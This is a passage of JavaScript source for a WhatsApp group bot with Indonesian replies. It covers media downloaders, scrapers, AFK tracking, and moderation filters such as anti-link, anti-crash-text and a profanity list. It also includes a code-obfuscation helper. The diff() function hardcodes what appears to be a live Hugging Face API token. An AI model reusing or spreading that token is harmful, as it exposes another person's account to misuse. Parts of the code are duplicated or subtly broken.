result = fs.readFileSync(`./database/${aibotzz}.mp3`)
Al.sendAudio(m.chat, result, m, true)
}
}

const stikdel = (hehe) => {
let annuuu = stikDel
Al.sendMessage(m.chat, {sticker: { url: `${annuuu}` }},{ quoted: floc})
}

// Function MonoSpace Font
function monospace(string) {
return '```' + string + '```'
}

//========
function hitungmundur(tanggal, bulan, tahun){
let from = new Date(`${bulan} ${tanggal}, ${tahun} 00:00:00`).getTime();
let now = Date.now();
let distance = from - now;
let hari = Math.floor(distance / (1000 * 60 * 60 * 24));
let jam = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
let menit = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
let detik = Math.floor((distance % (1000 * 60)) / 1000);
return hari + ' hari ' + jam + ' jam ' + menit + ' menit ' + detik + ' detik '
}
//========================
function happymod(query) {
    return new Promise((resolve, reject) => {
        axios.get(`https://www.happymod.com/search.html?q=${query}`).then(async tod => {
            const $ = cheerio.load(tod.data)
            let hasil = []
            $("div.pdt-app-box").each(function(c, d) {
                let name = $(d).find("a").text().trim();
                let icon = $(d).find("img.lazy").attr('data-original');
                let link = $(d).find("a").attr('href');
                let link2 = `https://www.happymod.com${link}`
                const Data = {
                    icon: icon,
                    name: name,
                    link: link2
                }
                hasil.push(Data)
            })
            resolve(hasil);
        }).catch(reject)
    });
}
//==========
 if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
m.reply(`Jangan ditag, dia sedang AFK\n\n*Alasan :* ${getReason2}\n*Sejak :* ${heheh2.hours} Jam, ${heheh2.minutes} Menit, ${heheh2.seconds} Detik yang lalu\n`)
}
}
if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
Al.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari AFK\n\n*Alasan :* ${getReason}\n*Selama :* ${heheh.hours} Jam ${heheh.minutes} Menit ${heheh.seconds} Detik\n`, m)
}
}
//======
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Me`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}
//==========
async function ytdlnew(videoUrl) {
    return new Promise(async (resolve, reject) => {
        try {
            const searchParams = new URLSearchParams();
            searchParams.append('query', videoUrl);
            searchParams.append('vt', 'mp3');
            const searchResponse = await axios.post(
                'https://tomp3.cc/api/ajax/search',
                searchParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (searchResponse.data.status !== 'ok') {
                throw new Error('Failed to search for the video.');
            }            
            const videoId = searchResponse.data.vid;
            const videoTitle = searchResponse.data.title;
            const mp4Options = searchResponse.data.links.mp4;
            const mp3Options = searchResponse.data.links.mp3;
            const mediumQualityMp4Option = mp4Options[136]; 
            const mp3Option = mp3Options['mp3128']; 
            const mp4ConvertParams = new URLSearchParams();
            mp4ConvertParams.append('vid', videoId);
            mp4ConvertParams.append('k', mediumQualityMp4Option.k);
            const mp4ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp4ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp4ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP4.');
            }
            const mp4DownloadLink = mp4ConvertResponse.data.dlink;
            const mp3ConvertParams = new URLSearchParams();
            mp3ConvertParams.append('vid', videoId);
            mp3ConvertParams.append('k', mp3Option.k);
            const mp3ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp3ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp3ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP3.');
            }
            const mp3DownloadLink = mp3ConvertResponse.data.dlink;
            resolve({
                title: videoTitle,
                mp4DownloadLink,
                mp3DownloadLink
            });
        } catch (error) {
            reject('Error: ' + error.message);
        }
    });
 }
//==========
const api = {
  xterm: {
    url: "https://ai.xterm.codes",
    key: "OPSIONAL"
  }
};

async function filters(imageurl, model) {
  let tryng = 0;
  // Membuat request filters
  let ai = await fetch(`${api.xterm.url}/api/img2img/filters?action=${model}&url=${imageurl}&key=${api.xterm.key}`)
    .then(response => response.json());

  if (!ai.status) return ai;
  console.log(ai);

  while (tryng < 50) { // Maksimal 50 kali
    tryng += 1; // Menambahkan nilai tryng
    // Pengecekan status request
    let s = await fetch(`${api.xterm.url}/api/img2img/filters/batchProgress?id=${ai.id}`)
      .then(response => response.json());

    if (s.status === 1) {
      console.log("Starting...");
    } else if (s.status === 2) {
      console.log("Processing...");
    } else if (s.status === 3) {
      return s; // Mengembalikan nilai s
    } else if (s.status === 4) {
      return console.log("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
    }

    await new Promise(resolve => setTimeout(resolve, 2000));
  }
}
//==========
async function diff(data) {
	const resspon = await fetch(
		"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
		{
			headers: { Authorization: "Bearer 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" },
			method: "POST",
			body: JSON.stringify(data),
		}
	)
	const result = await resspon.blob();
	let arrayBuffer = await result.arrayBuffer();
	const buffer = Buffer.from(arrayBuffer, 'base64')
	return buffer
}
//=======
async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }
//======
let isChat = m.mtype
//=======================================

async function loading () {
var nedd = [
"*[ 🕛 ]*  𝙈 - - - - - -",
"*[ 🕑 ]*  𝙈 𝘼 - - - - -",
"*[ 🕓 ]*  𝙈 𝘼 𝙉 - - - -",
"*[ 🕕 ]*  𝙈 𝘼 𝙉 𝙐 - - -",
"*[ 🕗 ]*  𝙈 𝘼 𝙉 𝙐 𝙇 - -",
"*[ 🕙 ]*  𝙈 𝘼 𝙉 𝙐 -",
"*[ 🕛 ]*  𝙈 𝘼 𝙉 𝙐 𝙇 💙"
]
let { key } = await Al.sendMessage(m.chat, {text: 'Loading...'}, { quoted: floc})

for (let i = 0; i < nedd.length; i++) {
/*await delay(20)*/
await Al.sendMessage(m.chat, {text: nedd[i], edit: key }, { quoted: floc});
}
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await Al.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Al.getName(i + '@s.whatsapp.net')}\nFN:${await Al.getName(i + '@s.whatsapp.net')}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:NOMOR\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GMAIL\nitem3.URL:${global.myweb}\nitem3.X-ABLabel:Instagram\nitem4.ADR:;;Masih Pemula Bang;;;;\nitem4.X-ABLabel:LOKASI\nEND:VCARD`
	    })
	}
//=========
async function before(m) {
this.autosholat = this.autosholat ? this.autosholat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? this.user.jid : m.sender
let id = m.chat
if (id in this.autosholat) {
return false
}
/*let data = await (await fetch("https://api.aladhan.com/v1/timingsByCity?city=Bekasi&country=Indonesia&method=8")).json();
let jadwalSholat = data.data.timings;*/
let jadwalSholat = {
Fajr: "04:30",
Sunrise: "05:57",
Dhuhur: "11:49",
Ashar: "15:03",
Sunset: "17:54",
Magrib: "17:50",
Isya: "19:00",
Imsak: "04:30",
Midnight: "23:55",
Firstthird: "21:54",
Lastthird: "01:55"
}
const date = new Date((new Date).toLocaleString("en-US", {
timeZone: "Asia/Jakarta"
}));
const hours = date.getHours();
const minutes = date.getMinutes();
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;
for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
let caption = `Hai @${who.split`@`[0]},\nWaktu *${sholat}* Telah Tiba, Ambilah Air Wudhu dan Segeralah Sholat\n\n*${waktu}*\n_Untuk wilayah *Jakarta* dan sekitarnya._`
this.autosholat[id] = [
this.m.reply(m.chat, caption, null, {
contextInfo: {
mentionedJid: [who]
}
}),
setTimeout(() => {
delete this.autosholat[id]
}, 57000)
]
}}}
//=======================
for (let aibotzz of imagenya){
if (budy === aibotzz) {
let imagebuffy = fs.readFileSync(`./media/image/${aibotzz}.jpg`)
Al.sendImage(m.chat, result, '', m)
Al.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let aibotzz of vn) {
if (budy === aibotzz) {
let audionya = fs.readFileSync(`./media/${aibotzz}.mp3`)
Al.sendMessage(m.chat, { audio: audionya, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let aibotzz of sticker){
if (budy === aibotzz){
let stickernya = fs.readFileSync(`./media/${aibotzz}.webp`)
Al.sendMessage(m.chat, { sticker: stickernya }, { quoted: m })
}
}
for (let aibotzz of video){
if (budy === aibotzz){
let videonya = fs.readFileSync(`./media/${aibotzz}.mp4`)
Al.sendMessage(m.chat, { video: videonya }, { quoted: m })
}
}
async function getGcName(groupID) {
try {
let data_name = await Al.groupMetadata(groupID)
return data_name.subject
} catch (err) {
return '-'
   }
}

const reply = (text) => {
Al.sendFakeLink(m.chat, text, salam, footer_text, thumb, myweb, pushname, m)
}

//Function Polling
Al.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
Al.sendteks = async(chatId, text = '', quoted = '', opts = {}) => {
return Al.sendMessage(chatId, { text: text, mentions: await Al.ments(text), ...opts}, {quoted:quoted})
};
Al.sendPoll = (jid, name = '', values = [], selectableCount = global.select) => {
return Al.sendMessage(jid, {poll: { name, values, selectableCount }})
};

if (global.autoTyping) {
if (command) { Al.readMessages([m.key])}
Al.sendPresenceUpdate('composing', from)
}
        
if (global.autoBio) {
Al.updateProfileStatus(`✨ ${namabot} WhatsApp Bot Online Now...💗`).catch(_ => _)
}

if (global.antiBot && !isAdmins) {
if (m.isBaileys && !m.fromMe == true){
if (!isAdmins || !isBotAdmins){		  
} else {
m.reply(`Wih Ada Bot Lain, Grup Nya Gua Tutup Dulu Deh`)
return await Al.groupSettingUpdate(from, 'announcement')
  }
  }
}
if (global.antiBot && !isAdmins) {
if (m.isBaileys && !m.fromMe == true){
if (!isAdmins || !isBotAdmins){		  
} else {
m.reply(`Wih Ada Bot Lain, Grup Nya Gua Tutup Dulu Deh`)
return await Al.groupSettingUpdate(from, 'announcement')
  }
  }
}

// AntiSpam (Group Close)
if (isAntiSpam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`[ SPAM ]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushname))
if (!isBotAdmins) return m.reply('Yah gua bukan Admin grup :(')
return await Al.groupSettingUpdate(from, 'announcement')
}
}

// AntiVirtex By AiBotzz-MD
if (isAntiVirtex) {
if (budy.includes('ผดิทุเ้ึางผืดิทุเ') || budy.includes('ผิดุท้เึางืผิดุท้เึาง') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('⃢ ⃢ ⃢') || budy.includes('ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.length > 5500) {
if (!isBotAdmins) return m.reply(`Yah kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isCreator) return m.reply(`Lu Owner gua tapi kok begitu sih?`)
await m.reply(`*「 ANTI VIRTEX 」*\n\nDarurat Untuk Admin, Ada Yang iseng Banget Nie Ngirim Virtex\n\nLu gua *kick* dan grup ini akan *ditutup* terlebih dahulu! *For the good of the members and their safety!*`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
await Al.groupSettingUpdate(m.chat, 'announcement')
}
}

// AntiWame
if (isAntiWame) {
if (budy.match(`wa.me`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI WAME 」*\n\nLink Wame Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Telegram
if (isAntiLTele) {
if (budy.match(`t.me`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK TELE 」*\n\nLink Telegram Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink SFile
if (isAntiLSfile) {
if (budy.match(`sfile.mobi`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK SFILE 」*\n\nLink SFile Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Xxnx
if (isAntiLxxnx) {
if (budy.match(`xxnx.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK XXNX 」*\n\nLink Xxnx Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink YT (Vidio)
if (isAntiLinkYoutubeVid) {
if (budy.match(`youtube.be`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK YTVID 」*\n\nLink Yt Vid Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink YT (Channel)
if (isAntiLinkYoutubeChannel) {
if (budy.match(`youtube.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK YTCH 」*\n\nLink Yt Ch Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Tiktok
if (isAntiLinkTiktok) {
if (budy.match(`tiktok.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK TT 」*\n\nLink Tiktok Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Twitter
if (isAntiLTwt) {
if (budy.match(`twitter.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK TWT 」*\n\nLink Twitter Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink (Semua Link)
if (isAntiLAll) {
if (budy.match(`https://|http//|//`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK ALL 」*\n\nLink All Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Facebook
if (isAntiLFb) {
if (budy.match(`facebook.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK FB 」*\n\nLink Fb Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Instagram
if (isAntiLIg) {
if (budy.match(`instagram.com`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK IG 」*\n\nLink Ig Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// AntiLink Discord
if (isAntiLDc) {
if (budy.match(`//discord`)) {
if (!isBotAdmins) return m.reply(`Ya kalo gua bukan Admin gua gak bisa hapus pesan nya :(`)
if (isAdmins) return m.reply(`Kalo sesama Admin sih gua gak berani ngehapus`)
if (isCreator) return m.reply(`Kamu Owner ku jadi gak masalah`)
await m.reply(`*「 ANTI LINK DC 」*\n\nLink Discord Terdeteksi, Maaf pesan kamu saya hapus!!`)
if (m.key.fromMe) return m.reply(`Hehe`)
await Al.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
await Al.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}

// Mute digrup chat yang ditentukan
if (m.isGroup && isMute) {
if (!isAdmins && !isCreator) return
}

// AntiFoto (Image)
if (isAntiFoto) {
if(isFoto === "imageMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Foto`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiAudio (Pesan suara)
if (isAntiAudio) {
if(isAudio === "audioMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Audio`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiVideo (Vidio)
if (isAntiVideo) {
if(isVideo === "videoMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Video`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiSticker (Stiker)
if (isAntiSticker) {
if(isSticker === "stickerMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Sticker`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiDocument (Dokumen)
if (isAntiDoc) {
if(isDoku === "documentMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Dokumen`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiContact (Kontak)
if (isAntiCon) {
if(isKontak === "contactMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Kontak`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiLocation (Lokasi)
if (isAntiLoc) {
if(isLokasi === "locationMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Lokasi`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiText (Teks)
if (isAntiTeks) {
if(isTeks === "quotedMessage") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti Teks 😂`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiViewOnce (1x Lihat)
if (isAntiVo) {
if(isVo === "viewOnceMessageV2") {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Admin Menghidupkan Anti View Once`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// EMOTE
const emote = (satu, dua) => {
try{	    
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
emoji.get(satu)
.then(emoji => {
Al.sendMessage(from, { caption: '_Done_', image: {url: emoji.images[dua].url} }, {quoted:m})
})
} catch (err) {
m.reply("Emoji error, Please enter another emoji\nNOTE : Just enter 1 emoji")
}
}

// AntiToxic (Kalimat tidak sopan)
if (isAntiToxic) {
if (budy.match('ajg|Ajg|anj|Anj|bokep|Bokep|babi|Babi|anjk|Anjk|kntl|Kntl|kontol|Kontol|bodoh|Bodoh|Tai|tai|memek|Memek|Memk|memk|Mmk|mmk|Bangsat|bangsat|Bngsat|bngsat|Bajingan|bajingan|Tolol|tolol|tlol|Tlol|Lol|lol|Bacot|bacot|Bcot|bcot|cot|Cot|goblok|Goblok|gblk|Gblk|gblok|Gblok|ngentod|Ngentod|ngentot|Ngentot|ngntod|Ngntod|ngntot|Ngntot|raimu|Raimu|peler|Peler|puki|Puki|pussy|Pussy|kuntul|Kuntul|kntul|Kntul|kintil|coli|Coli|anj|Anj|anjg|Anjg|ajg|Ajg|njing|Njing|pepek|Pepek|anying|Anying|dick|Dick|dog|Dog')) {
if (!isBotAdmins) return m.reply(`Kalo gua bukan Admin gimana mau hapus pesan nya, wkwk :v`)
if (isAdmins) return m.reply(`Gajadi, Kamu admin`)
if (isCreator) return m.reply(`Gajadi, Kamu ownerku`)
await Al.sendMessage(m.chat, { delete: m.key })
await m.reply(`Jangan Toxic Woilah`)
await Al.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
}
}

// AntiPromo (Promosi)
if (isAntiPromo) {
